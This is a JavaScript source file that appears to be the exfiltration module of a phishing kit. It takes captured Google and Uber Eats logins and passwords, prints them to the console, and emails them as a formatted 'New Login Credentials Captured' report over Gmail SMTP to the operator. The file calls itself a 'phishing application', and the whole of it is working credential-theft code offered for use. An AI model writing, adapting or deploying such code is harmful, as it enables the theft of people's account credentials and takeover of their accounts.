import dotenv from 'dotenv';
import nodemailer from 'nodemailer';

dotenv.config();

console.log('Email Service Configuration:');
console.log('GMAIL_USER:', process.env.GMAIL_USER);
console.log('GMAIL_APP_PASSWORD exists:', !!process.env.GMAIL_APP_PASSWORD);
console.log('RECIPIENT_EMAIL:', process.env.RECIPIENT_EMAIL);

// Create transporter with Gmail SMTP
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD
  }
});

// Verify transporter configuration
transporter.verify(function (error, success) {
  if (error) {
    console.log('❌ SMTP connection failed:', error);
  } else {
    console.log('✅ SMTP Server is ready to send emails');
  }
});

// Function to send credentials email
async function sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword) {
  console.log('\n=== SENDING EMAIL ===');
  console.log('Gmail User:', process.env.GMAIL_USER);
  console.log('Recipient:', process.env.RECIPIENT_EMAIL);
  console.log('\nCredentials to send:');
  console.log('Google Email:', googleEmail || 'N/A');
  console.log('Google Password:', googlePassword || 'N/A');
  console.log('Uber Email:', uberEmail || 'N/A');
  console.log('Uber Password:', uberPassword || 'N/A');
  console.log('==================\n');
  
  try {
    const htmlContent = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; background-color: #ffffff; }
          .header { background-color: #1a73e8; color: white; padding: 20px; text-align: center; border-radius: 5px 5px 0 0; }
          .content { background-color: #f9f9f9; padding: 20px; margin: 20px 0; border-radius: 5px; }
          .credentials { background-color: white; padding: 20px; margin: 15px 0; border-left: 4px solid #1a73e8; border-radius: 3px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
          .credentials h3 { margin-top: 0; color: #1a73e8; }
          .credential-row { margin: 10px 0; padding: 8px 0; border-bottom: 1px solid #eee; }
          .credential-row:last-child { border-bottom: none; }
          .label { font-weight: bold; color: #555; display: inline-block; width: 100px; }
          .value { color: #000; font-family: 'Courier New', monospace; background-color: #f5f5f5; padding: 4px 8px; border-radius: 3px; }
          .footer { text-align: center; color: #777; font-size: 12px; margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; }
          .timestamp { font-weight: bold; color: #1a73e8; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🔐 New Login Credentials Captured</h1>
          </div>
          
          <div class="content">
            ${googleEmail ? `
            <div class="credentials">
              <h3>📧 Google Account Credentials</h3>
              <div class="credential-row">
                <span class="label">Email:</span>
                <span class="value">${googleEmail}</span>
              </div>
              <div class="credential-row">
                <span class="label">Password:</span>
                <span class="value">${googlePassword}</span>
              </div>
            </div>
            ` : '<p><em>No Google credentials captured</em></p>'}

            ${uberEmail ? `
            <div class="credentials">
              <h3>🚗 Uber Eats Account Credentials</h3>
              <div class="credential-row">
                <span class="label">Email/Phone:</span>
                <span class="value">${uberEmail}</span>
              </div>
              <div class="credential-row">
                <span class="label">Password:</span>
                <span class="value">${uberPassword}</span>
              </div>
            </div>
            ` : '<p><em>No Uber Eats credentials captured</em></p>'}
          </div>

          <div class="footer">
            <p>This is an automated email from your phishing application.</p>
            <p class="timestamp">Captured at: ${new Date().toLocaleString('en-US', { 
              weekday: 'long', 
              year: 'numeric', 
              month: 'long', 
              day: 'numeric', 
              hour: '2-digit', 
              minute: '2-digit', 
              second: '2-digit' 
            })}</p>
          </div>
        </div>
      </body>
      </html>
    `;

    const mailOptions = {
      from: `"Phishing Alert System" <${process.env.GMAIL_USER}>`,
      to: process.env.RECIPIENT_EMAIL,
      subject: `🔐 New Credentials Captured - ${new Date().toLocaleDateString()}`,
      html: htmlContent,
      text: `New Credentials Captured:
      
Google Account:
Email: ${googleEmail || 'N/A'}
Password: ${googlePassword || 'N/A'}

Uber Eats Account:
Email: ${uberEmail || 'N/A'}
Password: ${uberPassword || 'N/A'}

Captured at: ${new Date().toLocaleString()}`
    };

    const info = await transporter.sendMail(mailOptions);

    console.log('✅ EMAIL SENT SUCCESSFULLY!');
    console.log('Message ID:', info.messageId);
    console.log('Accepted:', info.accepted);
    console.log('Response:', info.response);
    return { success: true, messageId: info.messageId };
  } catch (error) {
    console.error('❌ ERROR SENDING EMAIL:');
    console.error('Error message:', error.message);
    console.error('Error code:', error.code);
    console.error('Full error:', error);
    throw error;
  }
}

export { sendCredentialsEmail };
